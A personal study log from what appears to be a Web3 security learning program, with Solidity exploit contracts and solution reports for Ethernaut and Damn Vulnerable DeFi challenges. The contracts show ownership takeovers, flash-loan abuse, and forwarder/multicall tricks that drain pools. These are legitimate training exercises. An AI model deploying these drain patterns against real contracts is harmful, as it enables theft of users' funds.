---
timezone: Asia/Shanghai
---


# {Elvin}

1. 自我介绍
Hello, I am Elvin, majored in Computer Science. Security is the foundation of the next-generation financial network. I am really pleased to join with all of you for this valuable learning experience. Hope we could make the progress together for this program and the future challenges. :-)

2. 你认为你会完成本次残酷学习吗？
Definitely Yes.


## Notes

<!-- Content_START -->

### 2024.08.29

1. Ethernaut - Fallback
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IFallback {
    function contribute() external payable;
    function getContribution() external view returns (uint256);
    function withdraw() external;
    function owner() external view returns (address);
}

contract FallbackExploit {
    IFallback public target;

    constructor(address _targetAddress) {
        target = IFallback(_targetAddress);
    }

    function exploit() external payable {
        // Step 1: Contribute a small amount
        target.contribute{value: 0.0005 ether}();

        // Step 2: Trigger receive() function to become the owner
        (bool success,) = address(target).call{value: 0.0005 ether}("");
        require(success, "Failed to send Ether");

        // Confirm that we are now the owner
        require(target.owner() == address(this), "Failed to become owner");

        // Step 3: Withdraw all funds
        uint256 initialBalance = address(target).balance;
        target.withdraw();

        // Confirm that all funds have been withdrawn
        require(address(target).balance == 0, "Failed to withdraw all funds");

        // Confirm that we received the funds
        require(address(this).balance >= initialBalance, "Failed to receive funds");

        // Send the stolen funds to the caller of this function
        payable(msg.sender).transfer(address(this).balance);
    }

    // Allow the contract to receive Ether
    receive() external payable {}
}
```

2. Ethernaut - Fallout
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IFallout {
    function Fal1out() external payable;
    function owner() external view returns (address payable);
}

contract FalloutExploit {
    IFallout public target;

    constructor(address _targetAddress) {
        target = IFallout(_targetAddress);
    }

    function exploit() external {
        // Call the Fal1out function to become owner
        target.Fal1out();

        // Check if the exploit was successful
        require(target.owner() == address(this), "Exploit failed: ownership not transferred");
    }
}
```

### 2024.08.30

# Damn Vulnerable DeFi - Unstoppable - Solution Report

## Problem Analysis

### Goal

Halt the vault's flash loan functionality, starting with only 10 DVT tokens.

### Contract Summary

1. **UnstoppableVault**: An ERC4626-compliant vault offering flash loans.
2. **UnstoppableMonitor**: A contract to monitor the flash loan functionality.
3. **DamnValuableToken (DVT)**: The ERC20 token used in the vault.

## Vulnerability

The vulnerability is in the `flashLoan` function of the UnstoppableVault contract:

```solidity
if (convertToShares(totalSupply) != balanceBefore) revert InvalidBalance();
```

This check assumes that the total assets (balanceBefore) should always equal the converted shares of the total supply. However, this assumption can be broken by directly transferring tokens to the vault without minting shares.

## Attack Methodology

The attack exploits the vulnerability by transferring DVT tokens directly to the vault contract without using the deposit function. This creates a discrepancy between the vault's token balance and the total supply of shares, causing the flashLoan function to always revert due to the InvalidBalance check.

Steps:

1. Transfer DVT tokens directly to the vault contract address.
2. This transfer increases the vault's token balance without minting new shares.
3. The next attempt to take a flash loan will fail due to the InvalidBalance check.

## Proof of Concept (PoC)

The PoC is implemented in the test_unstoppable function:

```solidity
function test_unstoppable() public checkSolvedByPlayer {
    token.transfer(address(vault), INITIAL_PLAYER_TOKEN_BALANCE);
}
```

This simple action transfers the player's initial balance (10 DVT tokens) directly to the vault. As a result:

1. The vault's token balance increases by 10 DVT.
2. No new shares are minted.
3. The convertToShares(totalSupply) no longer equals the vault's token balance.
4. Any subsequent flash loan attempt will fail.


# Damn Vulnerable DeFi - Naive Receiver - Solution Report

## Problem Analysis

### Goal

Drain all WETH (1010 total) from FlashLoanReceiver (10 WETH) and NaiveReceiverPool (1000 WETH) to a designated recovery account in two or fewer transactions.

### Contract Summary

1. NaiveReceiverPool: Flash loan pool with 1000 WETH, fixed 1 WETH fee, meta-transaction support, and multicall function.
2. FlashLoanReceiver: Contract with 10 WETH, capable of receiving flash loans.
3. BasicForwarder: Enables meta-transactions for the pool.
4. Multicall: Abstract contract providing batched calls functionality using delegate calls.

## Vulnerability

1. Unprotected Flash Loan Mechanism: Lack of access controls and fixed fee regardless of loan amount.
2. Insufficient Withdrawal Controls: Inadequate validation for fund withdrawals.
3. Multicall and Delegate Call Exploitation: Allows batching operations and executing them in the pool's context, bypassing access controls.

These vulnerabilities combined enable draining both contracts in two transactions.

## Attack Methodology

1. Draining FlashLoanReceiver:

   - Use multicall to batch 10 flash loan calls of 0 WETH, each incurring 1 WETH fee.

2. Withdrawing from NaiveReceiverPool:
   - Prepare two withdrawal calls: one for accumulated fees, another for remaining balance.
   - Use BasicForwarder to create a meta-transaction calling pool's multicall function.
   - Execute withdrawals via delegate calls, bypassing access controls.

This two-step attack efficiently drains both contracts within the challenge's two-transaction limit.

## Proof of Concept (PoC)

The attack is implemented in the `test_naiveReceiver` function. Here's the complete PoC with code:

1. Draining the FlashLoanReceiver

```solidity
bytes[] memory drainCalls = new bytes[](10);
for (uint256 i = 0; i < 10; i++) {
    drainCalls[i] = abi.encodeWithSelector(pool.flashLoan.selector, address(receiver), address(weth), 0, "");
}
pool.multicall(drainCalls);
```

This code creates 10 identical flash loan calls, each borrowing 0 WETH but incurring the 1 WETH fee, and executes them in a single transaction using the pool's multicall function.

2. Withdrawing funds from the NaiveReceiverPool

```solidity
uint256 totalAmount = WETH_IN_POOL + WETH_IN_RECEIVER;

bytes[] memory withdrawCalls = new bytes[](2);

// Withdraw deployer's balance (accumulated fees)
uint256 deployerBalance = pool.deposits(pool.feeReceiver());
withdrawCalls[0] = abi.encodePacked(
    abi.encodeWithSelector(pool.withdraw.selector, deployerBalance, payable(recovery)), pool.feeReceiver()
);

// Withdraw remaining pool balance
withdrawCalls[1] = abi.encodePacked(
    abi.encodeWithSelector(pool.withdraw.selector, totalAmount - deployerBalance, payable(recovery)),
    address(pool)
);

// Create the forwarder request for the withdrawal
BasicForwarder.Request memory request = BasicForwarder.Request({
    from: player,
    target: address(pool),
    value: 0,
    gas: 3000000,
    nonce: forwarder.nonces(player),
    data: abi.encodeWithSelector(pool.multicall.selector, withdrawCalls),
    deadline: block.timestamp + 1 hours
});

// Sign the request
bytes32 digest = keccak256(abi.encodePacked("\x19\x01", forwarder.domainSeparator(), forwarder.getDataHash(request)));
(uint8 v, bytes32 r, bytes32 s) = vm.sign(playerPk, digest);
bytes memory signature = abi.encodePacked(r, s, v);

// Execute the withdrawal through the forwarder
forwarder.execute(request, signature);
```

This code prepares two withdrawal calls, one for the accumulated fees and another for the remaining pool balance. It then creates a meta-transaction using the BasicForwarder, signs it, and executes it to perform the withdrawals.

This PoC demonstrates how the identified vulnerabilities can be exploited to drain both the FlashLoanReceiver and the NaiveReceiverPool efficiently, transferring all 1010 WETH to the designated recovery address in just two transactions.


### 2024.08.31

# Damn Vulnerable DeFi - Truster Challenge - Solution Report

## Problem Analysis

### Goal

Drain all 1 million DVT tokens from the TrusterLenderPool contract in a single transaction and transfer them to a designated recovery account.

### Contract Summary

The TrusterLenderPool contract offers a flashLoan function that allows borrowing tokens for free. It transfers the requested amount to the borrower and then executes an arbitrary function call to a specified target address with provided data.

## Vulnerability

The vulnerability lies in the flashLoan function's ability to execute arbitrary function calls on behalf of the pool contract. This can be exploited to approve an attacker's contract to spend the pool's tokens without any restrictions.

## Attack Methodology

1. Create an attack contract that performs the following steps in its constructor:
   a. Prepare calldata to approve the attack contract to spend all of the pool's tokens.
   b. Call the flashLoan function with a zero amount, using the pool as the target and the approval calldata.
   c. Transfer all tokens from the pool to the recovery address using the gained approval.

2. Deploy the attack contract in a single transaction, which will execute the entire attack sequence.

## Proof of Concept (PoC)

1. The TrusterAttack contract implements the entire attack in its constructor:

```solidity
contract TrusterAttack {
    constructor(TrusterLenderPool pool, DamnValuableToken token, address player, address recovery) {
        // Step 1: Create the calldata for approving this contract to spend all of the pool's tokens
        bytes memory data = abi.encodeWithSignature("approve(address,uint256)", address(this), type(uint256).max);

        // Step 2: Call flashLoan with 0 amount
        pool.flashLoan(0, player, address(token), data);

        // Step 3: Now that we have approval, transfer all tokens from the pool to the recovery address
        uint256 balance = token.balanceOf(address(pool));
        token.transferFrom(address(pool), recovery, balance);
    }
}
```

2. The test_truster function in the TrusterChallenge contract deploys the attack contract:

```solidity
function test_truster() public checkSolvedByPlayer {
    // Deploy the TrusterAttack contract
    // This single line performs the entire attack:
    // 1. Approves the attacker contract to spend the pool's tokens
    // 2. Transfers all tokens from the pool to the recovery address
    // This is the only transaction executed by the player, ensuring their nonce is exactly 1
    new TrusterAttack(pool, token, player, recovery);
}
```

This single line of code executes the entire attack in one transaction, fulfilling the challenge requirement of the player's nonce being exactly 1.

# Damn Vulnerable DeFi - Side Entrance - Solution Report

## Problem Analysis

### Goal

The goal is to drain all 1000 ETH from the SideEntranceLenderPool contract and transfer it to a designated recovery account, starting with only 1 ETH in the player's balance.

### Contract Summary

The SideEntranceLenderPool contract allows users to deposit ETH, withdraw their balance, and take out flash loans. It maintains a mapping of user balances and provides free flash loans using the deposited ETH.

## Vulnerability

The vulnerability lies in the flash loan mechanism and how it interacts with the deposit function. The contract doesn't differentiate between actual deposits and internal transfers during a flash loan, allowing an attacker to artificially inflate their balance.

## Attack Methodology

1. Create an attack contract that implements the IFlashLoanEtherReceiver interface.
2. Request a flash loan for the entire pool balance.
3. During the flash loan callback, deposit the borrowed funds back into the pool.
4. After the flash loan completes, withdraw the entire balance, which now includes the artificially inflated amount.
5. Transfer the drained funds to the recovery address.

## Proof of Concept (PoC)

The attack is implemented in the `SideEntranceAttack` contract:

```solidity
contract SideEntranceAttack {
    SideEntranceLenderPool private immutable pool;
    address private immutable owner;

    constructor(address _pool) {
        pool = SideEntranceLenderPool(_pool);
        owner = msg.sender;
    }

    // This function is called by the pool during the flash loan
    function execute() external payable {
        require(msg.sender == address(pool), "Only pool can call");
        // Deposit the borrowed ETH back into the pool
        // This increases our balance in the pool's accounting
        pool.deposit{value: msg.value}();
    }

    // Main attack function
    function attack() external {
        require(msg.sender == owner, "Only owner can call");
        // Get the current balance of the pool
        uint256 poolBalance = address(pool).balance;
        // Request a flash loan for the entire pool balance
        pool.flashLoan(poolBalance);
        // After the flash loan, withdraw all our "deposited" funds
        pool.withdraw();
    }

    // Function to withdraw funds from this contract to a specified recipient
    function withdraw(address recipient) external {
        require(msg.sender == owner, "Only owner can call");
        uint256 balance = address(this).balance;
        (bool success,) = recipient.call{value: balance}("");
        require(success, "Transfer failed");
    }

    // Fallback function to receive ETH
    receive() external payable {}
}
```

The attack is executed in the test function:

```solidity
function test_sideEntrance() public checkSolvedByPlayer {
    // Deploy the attack contract
    SideEntranceAttack attacker = new SideEntranceAttack(address(pool));

    // Perform the attack
    attacker.attack();

    // Withdraw the funds to the recovery address
    attacker.withdraw(recovery);
}
```

This PoC successfully drains the entire pool balance of 1000 ETH and transfers it to the recovery address, achieving the goal of the challenge.


### 2024.09.01

1. Damn Vulnerable DeFi - The Rewarder
   [Solution Report](https://github.com/elvin-a-blockchain/damn-vulnerable-defi-v4-solution/blob/main/05-the-rewarder/05-the-rewarder-solution.md)
   [Solution Code](https://github.com/elvin-a-blockchain/damn-vulnerable-defi-v4-solution/blob/main/05-the-rewarder/TheRewarder.t.sol)

2. Damn Vulnerable DeFi - Selfie
   [Solution Report](https://github.com/elvin-a-blockchain/damn-vulnerable-defi-v4-solution/blob/main/06-selfie/06-selfie-solution.md)
   [Solution Code](https://github.com/elvin-a-blockchain/damn-vulnerable-defi-v4-solution/blob/main/06-selfie/Selfie.t.sol)

### 2024.09.02

1. Damn Vulnerable DeFi - Compromised
   [Solution Report](https://github.com/elvin-a-blockchain/damn-vulnerable-defi-v4-solution/blob/main/07-compromised/07-compromised-solution.md)
   [Solution Code](https://github.com/elvin-a-blockchain/damn-vulnerable-defi-v4-solution/blob/main/07-compromised/Compromised.t.sol)

2. Damn Vulnerable DeFi - Puppet
   [Solution Report](https://github.com/elvin-a-blockchain/damn-vulnerable-defi-v4-solution/blob/main/08-puppet/08-puppet-solution.md)
   [Solution Code](https://github.com/elvin-a-blockchain/damn-vulnerable-defi-v4-solution/blob/main/08-puppet/Puppet.t.sol)

### 2024.09.03

1. Damn Vulnerable DeFi - Puppet V2
   [Solution Report](https://github.com/elvin-a-blockchain/damn-vulnerable-defi-v4-solution/blob/main/09-puppet-v2/09-puppet-v2-solution.md)
   [Solution Code](https://github.com/elvin-a-blockchain/damn-vulnerable-defi-v4-solution/blob/main/09-puppet-v2/PuppetV2.t.sol)

2. Damn Vulnerable DeFi - Free Rider
   [Solution Report](https://github.com/elvin-a-blockchain/damn-vulnerable-defi-v4-solution/blob/main/10-free-rider/10-free-rider-solution.md)
   [Solution Code](https://github.com/elvin-a-blockchain/damn-vulnerable-defi-v4-solution/blob/main/10-free-rider/FreeRider.t.sol)

### 2024.09.04

1. Damn Vulnerable DeFi - Backdoor
   [Solution Report](https://github.com/elvin-a-blockchain/damn-vulnerable-defi-v4-solution/blob/main/11-backdoor/11-backdoor-solution.md)
   [Solution Code](https://github.com/elvin-a-blockchain/damn-vulnerable-defi-v4-solution/blob/main/11-backdoor/Backdoor.t.sol)

2. Damn Vulnerable DeFi - Climber
   [Solution Report](https://github.com/elvin-a-blockchain/damn-vulnerable-defi-v4-solution/blob/main/12-climber/12-climber-solution.md)
   [Solution Code](https://github.com/elvin-a-blockchain/damn-vulnerable-defi-v4-solution/blob/main/12-climber/Climber.t.sol)

### 2024.09.05
1. Secureum AMAZEX-DSS-PARIS - Challenge 1
   [Solution Report](https://github.com/elvin-a-blockchain/Secureum-AMAZEX-DSS-PARIS-solution/blob/main/01-magicETH/01-magicETH-solution.md)
   [Solution Code](https://github.com/elvin-a-blockchain/Secureum-AMAZEX-DSS-PARIS-solution/blob/main/01-magicETH/Challenge1.t.sol)

2. Secureum AMAZEX-DSS-PARIS - Challenge 2
   [Solution Report](https://github.com/elvin-a-blockchain/Secureum-AMAZEX-DSS-PARIS-solution/blob/main/02-modernWETH/02-modernWETH-solution.md)
   [Solution Code](https://github.com/elvin-a-blockchain/Secureum-AMAZEX-DSS-PARIS-solution/blob/main/02-modernWETH/Challenge2.t.sol)

### 2024.09.06

1. Secureum AMAZEX-DSS-PARIS - Challenge 3
   [Solution Report](https://github.com/elvin-a-blockchain/Secureum-AMAZEX-DSS-PARIS-solution/blob/main/03-lendingPool/03-lendingPool-solution.md)
   [Solution Code](https://github.com/elvin-a-blockchain/Secureum-AMAZEX-DSS-PARIS-solution/blob/main/03-lendingPool/Challenge3.t.sol)

### 2024.09.07
1. Secureum AMAZEX-DSS-PARIS - Challenge 5
   [Solution Report](https://github.com/elvin-a-blockchain/Secureum-AMAZEX-DSS-PARIS-solution/blob/main/05-balloon-vault/05-balloon-vault-solution.md)
   [Solution Code](https://github.com/elvin-a-blockchain/Secureum-AMAZEX-DSS-PARIS-solution/blob/main/05-balloon-vault/Challenge5.t.sol)

### 2024.09.08
1. Secureum AMAZEX-DSS-PARIS - Challenge 6
   [Solution Report](https://github.com/elvin-a-blockchain/Secureum-AMAZEX-DSS-PARIS-solution/blob/main/06-yieldPool/06-yieldPool-solution.md)
   [Solution Code](https://github.com/elvin-a-blockchain/Secureum-AMAZEX-DSS-PARIS-solution/blob/main/06-yieldPool/Challenge6.t.sol)

### 2024.09.09
1. Secureum AMAZEX-DSS-PARIS - Challenge 7
   [Solution Report](https://github.com/elvin-a-blockchain/Secureum-AMAZEX-DSS-PARIS-solution/blob/main/07-crystalDAO/07-crystalDAO-solution.md)
   [Solution Code](https://github.com/elvin-a-blockchain/Secureum-AMAZEX-DSS-PARIS-solution/blob/main/07-crystalDAO/Challenge7.t.sol)

### 2024.09.10
1. Secureum AMAZEX-DSS-PARIS - Challenge 8
   [Solution Report](https://github.com/elvin-a-blockchain/Secureum-AMAZEX-DSS-PARIS-solution/blob/main/08-oiler/08-oiler-solution.md)
   [Solution Code](https://github.com/elvin-a-blockchain/Secureum-AMAZEX-DSS-PARIS-solution/blob/main/08-oiler/Challenge8.t.sol)

### 2024.09.11


<!-- Content_END -->
